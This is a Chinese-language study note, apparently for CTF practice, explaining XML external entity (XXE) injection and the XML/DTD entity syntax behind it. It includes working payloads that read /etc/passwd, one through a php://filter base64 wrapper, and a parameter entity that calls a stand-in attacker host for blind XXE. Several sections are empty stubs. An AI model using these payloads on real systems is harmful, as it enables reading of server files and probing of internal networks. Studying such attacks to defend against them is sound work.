# XML外部实体

XML外部实体（XML External Entity，XXE）

![https://cdn.acunetix.com/wp-content/uploads/2017/07/11110336/image1.png](https://cdn.acunetix.com/wp-content/uploads/2017/07/11110336/image1.png)

- 读取本地文件
- 内网主机探测
- 内网主机端口扫描
带内实体注入攻击 - XML解析后，有结果回显
基于错误
带外实体注入攻击

## XML语法

可扩展标记语言（E**x**tensible **M**arkup **L**anguage，XML）是一种标记语言。XML是从标准通用标记语言（SGML）中简化修改出来的。它被设计用来传输和存储数据。[^1] 

- XML声明（declaration），如`<?xml version="1.0" encoding="UTF-8"?>`
- 文档类型定义（Document Type Definition，DTD），可以看成一个或者多个XML文件的模板，在这里可以定义XML文件中的元素、元素的属性、元素的排列方式、元素包含的内容等等。[^2]
  - 实体类型 - 内部实体和外部实体，通用实体和参数实体

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Person [ 
  <!ENTITY name "John"> 
]>
<Person>
<Name>&name;</Name>
<Age>20</Age>
</Person>
```

[^1]: [XML - w3school](https://www.w3school.com.cn/xml/index.asp)
[^2]: [DTD - w3school](https://www.w3school.com.cn/dtd/index.asp)

### 通用实体

在DTD中定义，在XML文档中引用

声明方式：`<!ENTITY 实体名称 "实体的值">`

引用方式：`&实体名称;`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
<foo>&myentity;</foo>
```

### 外部实体
可以从本地或远程调用实体

声明方式：`<!ENTITY 实体名称 SYSTEM "URI/URL">`

引用方式：`&实体名称;`

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
```

另一种引用方式

`<!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI">`


### 参数实体
在DTD中定义，只能在DTD中引用

声明方式：`<!ENTITY % 实体名称 "实体的值">`

引用方式：`%实体名称;`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY % myparameterentity "my parameter entity value" >
<!ENTITY % xxe SYSTEM "http://web-attacker.com"> 
%myparameterentity;%xxe; ]>
```

> 通常在Blind XXE中使用

## 读文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

## 内网主机探测


## 绕过方法

- 修改编码



<!--
TODO:
docx文档的XXE，https://xz.aliyun.com/t/11203

-->

通用实体、参数实体、预定义实体

## 经典赛题分析
## 参考资料
- https://tttang.com/archive/1716/